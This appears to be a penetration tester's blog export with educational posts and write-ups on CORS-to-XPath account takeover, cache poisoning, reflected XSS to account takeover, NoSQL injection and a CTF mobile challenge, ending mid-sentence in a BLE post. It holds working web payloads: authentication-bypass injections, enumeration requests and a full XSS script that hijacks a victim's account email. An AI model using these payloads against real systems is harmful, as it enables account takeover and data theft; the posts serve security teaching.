
[{"content":"Hi! I\u0026rsquo;m Max, a cybersecurity professional specializing in penetration testing. My work focuses on security research, and I\u0026rsquo;m currently involved in several innovative projects. Beyond my primary role, I dedicate time to exploring various areas within cybersecurity, sharing my findings and insights through blog posts. Feel free to connect with me on LinkedIn to learn more about my latest work in the field.\n","date":"21 February 2025","externalUrl":null,"permalink":"/","section":"","summary":"Hi! I\u0026rsquo;m Max, a cybersecurity professional specializing in penetration testing.","title":"","type":"page"},{"content":" Introduction #\rOver the past year, we\u0026rsquo;ve developed a cutting-edge car hacking demonstrator primarily for internal training purposes. This platform emulates a real car \u0026ndash; with authentic CAN communication \u0026ndash; and offers a hands-on way to explore automotive vulnerabilities. Through various dashboards, including a speed gauge, attacker view, and defender view, we can simulate attacks and visually observe their consequences in real time.\nBackground \u0026amp; Context #\rWhy Automotive Cybersecurity Matters #\rAutomotive cybersecurity has become increasingly important as modern vehicles integrate more advanced IT and operational technology systems. With connected cars becoming the norm, vulnerabilities in communication protocols like the CAN bus have the potential to compromise vehicle safety and performance. Our demonstrator was built as an internal training tool to bridge the gap between theoretical knowledge and real-world application, allowing us to better understand these vulnerabilities in a controlled environment.\nOverview of the Demonstrator #\rOur demonstrator is an innovative training platform that replicates the behavior of a real car. It is built to simulate the intricate communication that occurs over the CAN bus, ensuring that the training experience closely mirrors real-world scenarios. The system includes multiple control units that perform individual tasks, much like those found in an actual vehicle. For example, the demonstrator can execute CAN injection attacks, such as speed manipulation, with these actions immediately reflected on the visual dashboards. In addition to the current dashboards which are controlled via an Xbox controller, we are planning to incorporate a 3D simulator alongside the driver dashboard in our upcoming version. This new feature will allow us to visualize attack scenarios in even greater detail and provide an even more immersive training experience. Moreover, we plan to integrate various hardware accessories, such as an OBD2 connector, that will allow us to connect real-life diagnostic devices to the demonstrator. This connector will enable us to simulate attacks even closer to reality, further enhancing the authenticity of our training experience.\nDemonstrator #\rDriver Dashboard #\rAttacker Dashboard #\rDefender Dashboard #\rArchitecture and Setup #\rAlthough we will not delve into the specific hardware details, it is important to note that our demonstrator mirrors a real car’s architecture. It employs a modular design with distinct control units that manage functions like speed regulation and sensor feedback. The system leverages real CAN bus communication protocols to maintain authenticity, and the integrated dashboards provide clear, visual feedback during each phase of an attack. This realistic emulation helps our team understand how various vulnerabilities can be exploited and, in turn, how they might be mitigated in real vehicles.\nFuture Outlook and Recommendations #\rAs automotive technology continues to evolve, the sophistication of potential cyberattacks is also expected to increase. Our car hacking demonstrator will evolve alongside these emerging threats, ensuring that our training remains relevant and effective. We believe that practical, hands-on training is essential for preparing security teams to defend against these threats.\nConclusion #\rOur car hacking demonstrator stands as a testament to the critical role of practical training in the realm of automotive cybersecurity. By emulating a real car\u0026rsquo;s control systems and leveraging authentic CAN communication, the platform provides a vivid, real-time insight into the mechanics of cyberattacks and the corresponding defensive strategies. We are confident that tools like this are essential for equipping security teams with the knowledge and skills needed to protect the vehicles of tomorrow.\n","date":"21 February 2025","externalUrl":null,"permalink":"/posts/demonstrator-v1/","section":"Posts","summary":"Introduction #\rOver the past year, we\u0026rsquo;ve developed a cutting-edge car hacking demonstrator primarily for internal training purposes.","title":"Inside Our Car Hacking Demonstrator","type":"posts"},{"content":"","date":"21 February 2025","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":" During an assesment, I uncovered a chain of exploits that began with a CORS misconfiguration and culminated in an account takeover / authentication bypass via XPath injection in an API endpoint. This article will describe the essentials of CORS, XPATH injections, and the way I was able to exploit the chain.\nBasics #\rWhat Is CORS? #\rCross-Origin Resource Sharing (CORS) is a security feature implemented in web browsers that allows web pages to make requests to a different domain than the one that served the web page. In simpler terms, it enables a web application running on one domain to request resources from another domain securely.\nSame-Origin Policy #\rTo understand CORS, it\u0026rsquo;s essential to understand the same-origin policy, a fundamental security concept in web development. By default, a web browser restricts scripts on a web page from making requests to a different domain. This means a script loaded from one origin cannot interact with resources from another origin.\nAn origin is defined by three components:\nProtocol: The communication method (e.g., http, https) Host: (domain and subdomain, e.g., example.com, api.example.com) Port: The server port number (e.g., :80, :443) For example:\nhttps://www.example.com and https://api.example.com are different origins because the subdomains (Host) differ http://www.example.com and https://www.example.com are different origins because the protocols differ How Does CORS Work? #\rCORS provides a way for the server to relax the same-origin policy by specifying who can access its resourcesy. It does this through HTTP headers that tell the browser whether to allow a web page to access resources from a different origin.\nAllowed Origins #\rGET /page HTTP/1.1 Host: example.com Origin: https://www.example.com HTTP/1.1 200 OK Access-Control-Allow-Origin: https://www.example.com When sending a request with the Origin header set, the webserver will respond with the Access-Control-Allow-Origin header, and if allowed, the requested Origin.\nAuthentication #\rHTTP/1.1 200 OK Access-Control-Allow-Origin: https://www.example.com Access-Control-Allow-Credentials: true If the allow credentials header is configured, the browser is instructed to include authentication credentials, e.g. cookies, in the request automatically.\nWhat Is XPath? #\rXPath (XML Path Language) is a query language used for selecting nodes from an XML document. It allows you to navigate through elements and attributes in an XML document, making it easier to extract and manipulate data.\nBasic Concepts #\rNodes: The fundamental units in an XML document, including elements, attributes, text, and comments.\n\u0026lt;library\u0026gt; \u0026lt;book category=\u0026#34;fiction\u0026#34;\u0026gt; \u0026lt;title\u0026gt;The Adventures of Tom Sawyer\u0026lt;/title\u0026gt; \u0026lt;author\u0026gt;Mark Twain\u0026lt;/author\u0026gt; \u0026lt;/book\u0026gt; \u0026lt;book category=\u0026#34;non-fiction\u0026#34;\u0026gt; \u0026lt;title\u0026gt;A Brief History of Time\u0026lt;/title\u0026gt; \u0026lt;author\u0026gt;Stephen Hawking\u0026lt;/author\u0026gt; \u0026lt;/book\u0026gt; \u0026lt;/library\u0026gt; Expressions: XPath uses path expressions to select nodes or node sets in an XML document.\nSelect the First Element\n/library/book[1]\nSelect Elements with a Specific Attribute\n/book[@category='fiction']\nThe Exploit #\rEndpoint Enumeration #\rThe first step in any penetration test involves mapping out the application\u0026rsquo;s attack surface. Normally, I begin by enumerating the API endpoints of the target. However, every endpoint I discovered required an authentication bearer token, preventing any further interaction without valid credentials\nCORS Misconfiguration #\rWhile enumerating the application, I noticed that there was a CORS misconfiguration regarding allowed origins. Upon sending a request containing arbitrary Origins, I got the following responses.\nGET / HTTP/1.1 Host: target.com Origin: https://www.attacker.com HTTP/1.1 200 OK Access-control-allow-origin: attacker.com Access-Control-Allow-Credentials: true The Access-Control-Allow-Origin header was set to a wildcard, effectively allowing any origin to access the resources. Combined with Access-Control-Allow-Credentials: true, this meant that browsers would include cookies and authentication credentials in cross-origin requests.\nExploiting CORS #\rfetch(\u0026#39;https://target-application.com/protected-endpoint\u0026#39;, { method: \u0026#39;GET\u0026#39;, credentials: \u0026#39;include\u0026#39; // Tell the browser to include saved credentials }) .then(response =\u0026gt; response.json()) .then(data =\u0026gt; { console.log(data); // Potentially exfiltrate data to attacker-controlled server }); This script attempts to access a protected endpoint, with the browser including any credentials due to the misconfigured CORS policy. That essentially means, that we can use the victims session to interact with the protected API functions. Now that we bypassed the protected endpoints, let us check if there are any vulneratbillities within those API functions.\nExploiting XPath #\rDuring recon I found an endpoint called /token. This endpoint is essentially used to login via POST parameters (username, password) and retreive an API bearer token, which can then be used to access and use the API functions. Here, different users had different access rights on different endpoints. The endpoint is using an XML document as a Database. Here, XPath queries are used to search for a user:password combination in the Database and authenticate them. A basic query might look something like this:\n/root/*[password=\u0026#39;Test123\u0026#39; and username=\u0026#39;MyUser\u0026#39;] Injection Payload #\rPOST /token HTTP/1.1 Host: target-application.com Content-Type: application/x-www-form-urlencoded username=\u0026#39; or \u0026#39;1\u0026#39;=\u0026#39;1\u0026amp;password=\u0026#39; or \u0026#39;1\u0026#39;=\u0026#39;1 This payload (URL encoded) injects an always-true condition into the XPath query. The backend likely executed a query similar to:\n/root/*[password=\u0026#39;\u0026#39; or \u0026#39;1\u0026#39;=\u0026#39;1\u0026#39; and username=\u0026#39;\u0026#39; or \u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;] Given the injected condition, the query most likely returns / uses the first user in the XML database, effectively bypassing authentication controls and providing me with a valid Bearer Token for that account, which I can then use to access their API functions.\nEnumerating Users #\rTo escalate the attack, we can try to enumerate usernames and extract passwords using XPath functions like starts-with() and substring(). By iterating over character positions and possible values, we can try to reconstructed usernames and passwords, gaining access to multiple accounts.\nPOST /token HTTP/1.1 Host: target-application.com Content-Type: application/x-www-form-urlencoded username=\u0026#39; or string-length(username)=5 and \u0026#39;1\u0026#39;=\u0026#39;1\u0026amp;password=irrelevant POST /token HTTP/1.1 Host: target-application.com Content-Type: application/x-www-form-urlencoded username=\u0026#39; or substring(username,1,1)=\u0026#39;a\u0026#39; and \u0026#39;1\u0026#39;=\u0026#39;1\u0026amp;password=irrelevant Conclusion #\rThis engagement underscored how a seemingly minor issues can be chained together for significant impact. A CORS misconfiguration allowed me to bypass the same-origin policy, and an XPath injection in the authentication mechanism enabled full account compromise.\n","date":"20 February 2025","externalUrl":null,"permalink":"/posts/cors-to-ato/","section":"Posts","summary":"During an assesment, I uncovered a chain of exploits that began with a CORS misconfiguration and culminated in an account takeover / authentication bypass via XPath injection in an API endpoint.","title":"CORS Misconfiguration to Account Takeover","type":"posts"},{"content":" Terminology #\rKeyed Parameters #\rKeyed parameters are parameters that the cache system considers when storing and retrieving cached content. This means that variations in these parameters will result in different cached entries.\nFor example, if the URL has parameters such as ?user=123 and the cache is keyed on this parameter, the cache will store and serve different content (cache miss) for ?user=123 and ?user=456.\nUnkeyed Parameters #\rUnkeyed parameters are parameters that the cache system ignores when storing and retrieving cached content. This means that variations in these parameters will not result in different cached entries. The cache will store only one version of the content (cache hit), regardless of the variations in these parameters.\nIdentifying Unkeyed Parameters #\rThe first step is to identify unkeyed parameters, since keyed parameters need to be the same when the victim accesses the resource.\nExample #\rAssume we open example.com on /page with the following parameters:\nGET /page?user=admin\u0026amp;tracking=abc HTTP/1.1 Host: example.com Since example.com uses caching and we are visiting the page for the first time, we will see a cache MISS:\nHTTP/1.1 200 OK Content-Type: text/html Content-Length: 456 X-Cache: MISS \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Welcome\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Welcome, admin!\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Now we alter each parameter and check weather we get a cache miss or hit. A cache MISS indicates us that this parameter is keyed, since the server loaded a new version of the website.\nGET /page?user=guest\u0026amp;tracking=abc HTTP/1.1 Host: example.com HTTP/1.1 200 OK Content-Type: text/html Content-Length: 456 X-Cache: MISS \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Welcome\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Welcome, guest!\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Now that we identified the user parameter to be keyed, let’s continue and check the tracking parameter. Before we change the tracking parameter, lets resent our initial request where we got a cache MISS, to verify that the sytem now cached it.\nGET /page?user=admin\u0026amp;tracking=abc HTTP/1.1 Host: example.com HTTP/1.1 200 OK Content-Type: text/html Content-Length: 456 X-Cache: HIT \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Welcome\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Welcome, admin!\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Great. Now, let\u0026rsquo;s alter the value of the tracking parameter to see whether we get a cache MISS, indicating a keyed parameter, or a HIT again, indicating an unkeyed parameter.\nGET /page?user=admin\u0026amp;tracking=some-other-value HTTP/1.1 Host: example.com HTTP/1.1 200 OK Content-Type: text/html Content-Length: 456 X-Cache: HIT \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Welcome\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Welcome, admin!\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; We can observe the tracking parameter must be a unkeyed value, since the cache always returns HIT, even though the value of the parameter was changed.\nThe same thing also sometimes applies to header values in the HTTP requests.\nExploitation #\rOne of the most common ways to exploit cache poisoning is through XSS, though there are other attacks like DoS and unkeyed cookies. To exploit a XSS you have to find an injection point using an unkeyed parameter. The XSS will then be severed to all other users loading that cached version.\nExample #\rImagine we have an injection via the tracking parameter into a meta tag like this:\nGET /page?user=admin\u0026amp;tracking=https://mytrack.com HTTP/1.1 ... \u0026lt;meta http-equiv=\u0026#34;refresh\u0026#34; content=\u0026#34;https://mytrack.com\u0026#34; /\u0026gt; ... As before, when sending the initial request to the server, we will receive a cache MISS. So let us inject a simple XSS payload via the unkeyed tracking parameter \u0026quot;\u0026gt;\u0026lt;img/src/onerror=print()\u0026gt;.\nContent-Type: text/html Content-Length: 456 X-Cache: MISS \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Welcome\u0026lt;/title\u0026gt; \u0026lt;meta http-equiv=\u0026#34;refresh\u0026#34; content=\u0026#34;https://\u0026#34;\u0026gt;\u0026lt;img/src/onerror=print()\u0026gt; /\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Welcome, admin!\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Since tracking is an unkeyed parameter, anybody who visits the page /page?user=admin will be a victim of the XSS attack.\nAdvanced Techniques #\rThere are multiple advanced things we can try to get and escalate a cache poisoning attack. However for now let us focus one just one of those, a \u0026ldquo;Fat GET\u0026rdquo;.\nFat GET #\rA \u0026ldquo;Fat GET\u0026rdquo; request, is when we use GET parameters in the post body, while still using the GET verb. If a server is misconfigured it might parse the parameters from the body. With this you can try to create a discrepancy between the webserver and the cache. With this we can also use keyed parameters, since they are no longer directly present in the URL. We can then go back and perform an XSS attack the same way we did before.\nGET /page?user=admin\u0026amp;tracking=abc HTTP/1.1 Host: example.com user=guest Content-Type: text/html Content-Length: 456 X-Cache: MISS \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Welcome\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Welcome, guest!\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; GET /page?user=admin\u0026amp;tracking=abc HTTP/1.1 Host: example.com user=\u0026lt;/p\u0026gt;\u0026lt;img/src/onerror=print()\u0026gt;\u0026lt;p\u0026gt; Content-Type: text/html Content-Length: 456 X-Cache: MISS \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Welcome\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Welcome, \u0026lt;/p\u0026gt;\u0026lt;img/src/onerror=print()\u0026gt;\u0026lt;p\u0026gt;!\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Again, if a victim now opens example.com/page?user=admin the XSS will be loaded from the cache.\nA Real Life PoC #\rGET /?cb=100\u0026amp;\u0026#34;\u0026gt;\u0026lt;image/src/onerror=print()\u0026gt; HTTP/2 Host: target-website.com Accept-Language: en-US;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36 HTTP/2 200 OK CACHE: HIT ... \u0026lt;meta property=\u0026#34;og:url\u0026#34; content=\u0026#34;https://target-website.com/?cb=100\u0026amp;\u0026#34;\u0026gt;\u0026lt;image/src/onerror=print()\u0026gt;\u0026#34;\u0026gt; ... In this example, an image tag with an onerror event is injected into the URL parameter. When the server processes this request, the parameter is reflected in the HTML response and cached. Consequently, subsequent users requesting the cached page will execute the malicious JavaScript.\n","date":"19 February 2025","externalUrl":null,"permalink":"/posts/intro-to-cache-poisoning/","section":"Posts","summary":"Terminology #\rKeyed Parameters #\rKeyed parameters are parameters that the cache system considers when storing and retrieving cached content.","title":"Introduction to Cache Poisoning Attacks","type":"posts"},{"content":" The Vulnerabillity #\rWhen researching an application, I noticed that there was a feature for resetting the email address of our user. Interestingly, when trying to change it, there was no security mechanism verifying that the change was actually initiated by the user of that account. Normally, there’s an extra step where the user must input their password or any other identification method.\nSo, the first thing that came to mind was trying to carry out a CSRF attack, where I force the user to change their email to mine. This would allow me to use the regular “forgot password” function from the website, then input the email address that was set in the victim’s account, receive the reset email, and change the password to a desired one. However, I quickly realized that WordPress securely handled CSRF tokens in this application, so I wasn’t able to take that route yet. The next idea was to find an XSS vulnerability, which would allow me to just read those tokens out of the HTML and submit the form with those automatically.\nFinding XSS #\rLuckily, during my research, I came across a simple reflected XSS in the application: https://example.com/login/confirm_mail.php?email=\u0026lt;img/src/onerror=print()\u0026gt;\nCreating the Exploit Script #\rThe next step was to create the script that would automatically change the email address in the user’s settings. However, we first have to get the nonce that Wordpress added to each form request.\nPoC #\rfetch(\u0026#39;https://example.com/edit-account/\u0026#39;).then(response =\u0026gt; response.text()).then(html =\u0026gt; { // Fetch the nonce from vulnerable endpoint var parser = new DOMParser(); var doc = parser.parseFromString(html, \u0026#39;text/html\u0026#39;); var nonce = doc.getElementById(\u0026#39;save-account-details-nonce\u0026#39;).value; console.log(nonce); // Change email fetch(\u0026#39;https://example.com/edit-account/\u0026#39;, { method: \u0026#39;POST\u0026#39;, // Include Cookies credentials: \u0026#39;include\u0026#39;, headers: { \u0026#39;Content-Type\u0026#39;: \u0026#39;application/x-www-form-urlencoded\u0026#39;, }, body: `first_name=Test \u0026amp;last_name=Test \u0026amp;display_name=Test \u0026amp;email=\u0026lt;email we controll\u0026gt; \u0026amp;password_current= \u0026amp;password_1= \u0026amp;password_2= \u0026amp;save-account-details-nonce=${nonce}` }) .then(response =\u0026gt; { if (response.ok) { console.log(\u0026#34;Done!\u0026#34;); } else { console.log(\u0026#34;Something went wrong..\u0026#34;); } }); }); The password parameters can be left empty, since the application only uses those, when a user wants to change their password via the UI on the website:\npassword_current= password_1= password_2= Explanation: We first send a request to the vulnerable endpoint to retrieve the nonce: https://example.com/edit-account/. The response is parsed, and the nonce is extracted from the HTML doc.getElementById('save-account-details-nonce').value. After that, we send a second request to the endpoint where we then fill out the forms details. This request includes the nonce and the attacker’s desired email address. The credentials parameter ensures cookies are included, maintaining the session context.\nWith this script in hand we can include it via our reflected XSS https://example.com/login/confirm_mail.php?email={ATTACKER-SCRIPT} and send it to a victim. After the script automatically updates the email address of the victim, we can use the already described way via the password reset function. Thus, the account is fully compromised where the victim isn\u0026rsquo;t even able to recover the account, since not only the password but also the email address changed.\n","date":"19 February 2025","externalUrl":null,"permalink":"/posts/reflected-xss-to-ato/","section":"Posts","summary":"The Vulnerabillity #\rWhen researching an application, I noticed that there was a feature for resetting the email address of our user.","title":"Reflected XSS to Account Takeover","type":"posts"},{"content":" Overview #\rNoSQL databases like MongoDB, Couchbase, and Cassandra have gained immense popularity due to their flexibility, scalability, and performance benefits over traditional relational databases. However, with this rise in adoption comes an increase in security vulnerabilities. NoSQL injection attacks occur when untrusted user input is improperly handled and executed within a NoSQL query, allowing an attacker to manipulate database operations. These vulnerabilities are as dangerous as traditional SQL injections but are often overlooked due to the misconception that NoSQL databases are inherently secure.\nTypes of NoSQL Injection #\rNoSQL injection attacks can be categorized based on how the attacker interacts with the database and the feedback received. Understanding these types is crucial for both developers and security professionals to identify and mitigate potential threats.\nIn-Band Injection #\rIn-Band Injection involves the attacker using the same communication channel to both launch the attack and gather results. This method is straightforward because the feedback is immediate.\nExample Scenario: Consider a web application using MongoDB that accepts user login credentials via an HTTP POST request. The vulnerable PHP code might look like this:\n// Vulnerable PHP code $collection-\u0026gt;find([ \u0026#39;username\u0026#39; =\u0026gt; $_POST[\u0026#39;username\u0026#39;], \u0026#39;password\u0026#39; =\u0026gt; $_POST[\u0026#39;password\u0026#39;] ]); $collection-\u0026gt;find($query); An attacker can craft an HTTP request to exploit this unsanitized input:\nPOST /login.php HTTP/1.1 Host: example.com Content-Type: application/x-www-form-urlencoded username=admin\u0026amp;password[$ne]=null Explanation: PHP Array Syntax \u0026ndash; When writing MongoDB queries in PHP, arrays represent MongoDB’s query structure. The syntax password[$ne]=null translates to an associative array in PHP:\n$query = [ \u0026#39;password\u0026#39; =\u0026gt; [ \u0026#39;$ne\u0026#39; =\u0026gt; null ] ]; Resulting Query:\ndb.users.findOne({ username: \u0026#34;admin\u0026#34;, password: { \u0026#34;$ne\u0026#34;: null } }); Since the password is not null, the condition is true, and the attacker gains unauthorized access as the admin.\nBlind Injection #\rBlind Injections occur when an attacker cannot see the direct results of their injected queries but can infer information based on the application’s responses, such as differences in content, HTTP status codes, error messages, or response times.\nBoolean-Based #\rIn a Boolean-Based Blind Injection, the attacker sends queries that evaluate to either true or false and observes the application’s behavior to infer information about the database.\nExample Scenario: Consider a search functionality with a NoSQL Injection vulnerability, where users can search for products. An attacker sends a request with a crafted search term:\nGET /search.php?search[$regex]=^S.* HTTP/1.1 Host: example.com If a product starting with the letter “S” exists:\nHTTP/1.1 200 OK Content-Type: text/html { Exists: true } Otherwise:\nHTTP/1.1 200 OK Content-Type: text/html No products found. To extract the full name of the product, the attacker continues testing each subsequent character to reconstruct the produc name:\nsearch[$regex]=^Se.* ✔️ search[$regex]=^Sea.* ✖️ search[$regex]=^Sec.* ✔️ … search[$regex]=^SecretProduct$ The $ indicates the end of a string, verifying if the entire word is correct.\nTime-Based #\rIn a Time-Based Blind Injection, the attacker sends queries that cause the server to delay its response when certain conditions are true. By measuring these response times, the attacker can infer information about the database.\nExample Scenario: Assume a NoSQL Injection vulnerability in the username parameter:\nPOST /login HTTP/1.1 Host: example.com Content-Type: application/json { \u0026#34;username\u0026#34;: { \u0026#34;$where\u0026#34;: \u0026#34;function() { if(this.username == \u0026#39;admin\u0026#39;) { sleep(5000); } return true; }\u0026#34; }, \u0026#34;password\u0026#34;: \u0026#34;randompassword\u0026#34; } Explanation: JavaScript Function \u0026ndash; The this keyword refers to the current document being evaluated in the collection.\nif(this.username == \u0026#39;admin\u0026#39;) { sleep(5000); } Behavior: If this.username == 'admin' evaluates to true, the function calls sleep(5000) to delay the response by 5 seconds, indicating that the username exists. Otherwise, the response time remains normal.\nAn attacker can enumerate usernames or other fields character by character using a similar method:\n{ \u0026#34;username\u0026#34;: { \u0026#34;$where\u0026#34;: \u0026#34;function() { if (this.username[0] == \u0026#39;a\u0026#39;) { sleep(5000); } return true; }\u0026#34; }, \u0026#34;password\u0026#34;: \u0026#34;irrelevant\u0026#34; } By systematically testing each character position, the attacker can reconstruct sensitive information.\nServer-Side JavaScript Injection (SSJI) #\rMongoDB allows the use of JavaScript expressions in queries via the $where operator. If not handled securely, this feature can be exploited.\nExample Scenario: Consider the following MongoDB query in a Node.js application:\ncollection.findOne({ $where: `this.username == \u0026#39;${username}\u0026#39; \u0026amp;\u0026amp; this.password == \u0026#39;${password}\u0026#39;` }, function(err, user) { if (user) { res.send(\u0026#39;Logged in as \u0026#39; + user.username); } else { res.send(\u0026#39;Authentication failed\u0026#39;); } }); An attacker can manipulate the username field to inject malicious code:\nPOST /login HTTP/1.1 Host: example.com Content-Type: application/x-www-form-urlencoded username=admin\u0026#39; || true //\u0026amp;password=anything Resulting Query:\ndb.users.findOne({ $where: \u0026#34;this.username == \u0026#39;admin\u0026#39; || true // \u0026#39; \u0026amp;\u0026amp; this.password == \u0026#39;anything\u0026#39;\u0026#34; }); Effect: The condition this.username == 'admin' || true always evaluates to true, allowing the attacker to bypass authentication.\nFurther Exploitation: Attackers can use injections like \u0026quot; || \u0026quot;\u0026quot;==\u0026quot; or \u0026quot; || true || \u0026quot;\u0026quot;==\u0026quot; to evaluate the entire query to true. They can also enumerate fields using functions like match($regex) and the character-by-character approach mentioned earlier.\n","date":"18 February 2025","externalUrl":null,"permalink":"/posts/intro-to-nosql/","section":"Posts","summary":"Overview #\rNoSQL databases like MongoDB, Couchbase, and Cassandra have gained immense popularity due to their flexibility, scalability, and performance benefits over traditional relational databases.","title":"Introduction to NoSQL Injection Attacks","type":"posts"},{"content":" 🏆 318/1061 -- 700 Points Challange Type Points Finished Secure Bank Rev 100 November 16th, 11:55:09 PM BabyFlow Warmup 50 November 16th, 8:29:59 PM Rigged Slot Machine 1 Warmup 50 November 16th, 8:21:55 PM Trackdown 2 OSINT 100 November 15th, 8:09:06 PM Trackdown OSINT 100 November 15th, 7:49:05 PM Cold Storage Mobile 100 November 15th, 5:05:44 PM BioCorp Web 100 November 15th, 3:16:32 PM Pizza Paradise Web 100 November 15th, 2:46:25 PM Writeups #\rCold Storage 🐈 #\rThe Initial Roadblock: APK Installation Blues Like any eager hacker starting a mobile challenge, I dove straight in trying to install the APK. However, Android had other plans for my evening: adb install .\\\\cryptovault.apk Performing Streamed Install adb: failed to install .\\\\cryptovault.apk: Failure [INSTALL_PARSE_FAILED_NO_CERTIFICATES: Failed to collect certificates from /data/app/vmdl318868043.tmp/base.apk: Attempt to get length of null array] Ah yes, the classic \u0026ldquo;where\u0026rsquo;s your signature, buddy?\u0026rdquo; error. Android, being the responsible platform it is, refuses to run applications without proper signing. It\u0026rsquo;s like trying to enter a fancy restaurant without a tie – you\u0026rsquo;ve got to dress the part!\nMaking Our APK Presentable First things first, we need the Android SDK build tools. Adding them to PATH: C:\\\\Users\\\\\u0026lt;USER\u0026gt;\\\\AppData\\\\Local\\\\Android\\\\Sdk\\\\build-tools\\\\34.0.0 The Great Decompilation Adventure While we could jump straight to signing the APK, experience has taught us that we\u0026rsquo;ll need to decompile it anyway for our investigation. So why not kill two birds with one stone?\nTime to crack open this APK like a digital coconut using apktool. For those unfamiliar with apktool, it\u0026rsquo;s like having X-ray vision for Android apps - it lets us peek inside and see what makes them tick!\napktool d .\\\\cryptovault.apk cd cryptovaul smali files (Android\u0026rsquo;s equivalent of assembly code - as fun to read as ancient hieroglyphics!) Resource files in res/ The holy grail of Android app analysis: AndroidManifest.xml Creating Our Own VIP Pass Since we can't get in without proper credentials, let's make some! We'll create a signing key that would make any app proud: keytool -genkey -v -keystore research.keystore -alias research_key -keyalg RSA -keysize 2048 -validity 10000 Making Everything Pretty (And Aligned) Modern Android is picky about its APKs being aligned properly. Think of it as straightening your tie before entering: zipalign -p -f -v 4 cryptovault.apk aligned.apk The Final Touch: Signing Our Masterpiece apksigner sign --ks ./research.keystore ./aligned.apk And voilà! We now have an APK that Android will welcome with open arms.\nDown the Rabbit Hole: Application Analysis 🕵️‍♂️ You can also drag-and-drop the APK directly into the emulator if you're feeling fancy. adb install aligned.apk AndroidManifest.xml https://github.com/skylot/jadx\nDiving into the manifest, we find something interesting - or rather, the lack of something interesting. Just one lonely permission:\n\u0026lt;uses-permission android:name=\u0026#34;android.permission.INTERNET\u0026#34;/\u0026gt; At least our cat friend can browse cat memes while guarding the vault!\nThe manifest revealed a surprisingly minimalist activity structure:\n\u0026lt;activity android:name=\u0026#34;com.example.cryptoVault.MainActivity\u0026#34;\u0026gt; [..] \u0026lt;/activity\u0026gt; Web Assets: Where the Magic Happens The real treasure was hidden in Resources/assets/dexopt/www. Inside, we discovered the unlockVault() function, which revealed our feline friend's secret: PIN `7331`. It spells ‘1337’, but backwards.. wow!\nAfter entering the correct PIN, we were rewarded with\u0026hellip; another puzzle. An encrypted key. Because one layer of security is never enough!\nThe Final Boss: Key Decryption 🔐 The encryption scheme was hidden in an obfuscated keygen.js file. After some quality time with a deobfuscator, we uncovered the encryption algorithm:\nfunction affineEncrypt(value, multiplier, offset) { return (multiplier * value + offset) % 256; } function xor(a, b) { return a ^ b; } ... Rather than trying to understand the entire obfuscated mess (life\u0026rsquo;s too short!), Myself ChatGPT wrote a Python script to reverse the operations and retrieve the flag:\ndef affine_decrypt(value, multiplier, offset): for x in range(256): if (multiplier * x) % 256 == 1: break return (x * (value - offset)) % 256 # The encrypted treasure map encrypted_key_hex = \u0026#34;abf6c8abb5daabc8ab69d7846def17b19c6dae843a6dd7e1b1173ae16db184e0b86dd7c5843ae8dee15f\u0026#34; encrypted_key_bytes = hex_to_bytes(encrypted_key_hex) # Magic numbers (because every good crypto needs magic numbers) multiplier = 9 offset = 7 xor_key = 51 # Let the decryption begin! decrypted_bytes = [ affine_decrypt(xor(byte, xor_key), multiplier, offset) for byte in encrypted_key_bytes ] ","date":"17 February 2025","externalUrl":null,"permalink":"/ctfs/1337up-2024/","section":"Ctfs","summary":"🏆 318/1061 -- 700 Points Challange Type Points Finished Secure Bank Rev 100 November 16th, 11:55:09 PM BabyFlow Warmup 50 November 16th, 8:29:59 PM Rigged Slot Machine 1 Warmup 50 November 16th, 8:21:55 PM Trackdown 2 OSINT 100 November 15th, 8:09:06 PM Trackdown OSINT 100 November 15th, 7:49:05 PM Cold Storage Mobile 100 November 15th, 5:05:44 PM BioCorp Web 100 November 15th, 3:16:32 PM Pizza Paradise Web 100 November 15th, 2:46:25 PM Writeups #\rCold Storage 🐈 #\rThe Initial Roadblock: APK Installation Blues Like any eager hacker starting a mobile challenge, I dove straight in trying to install the APK.","title":"1337UP (2024)","type":"ctfs"},{"content":" Overview #\rFeel free to skip to the hacking part directly if you don\u0026rsquo;t care about the basics of BLE\nBluetooth Low Energy (BLE) #\rBluetooth Low Energy (BLE), is a Protocol spoken by many modern devices. The key difference to regular Bluetooth is that BLE is intended to consume less power while maintaining a similar communication range. This is achieved by implementing a always off 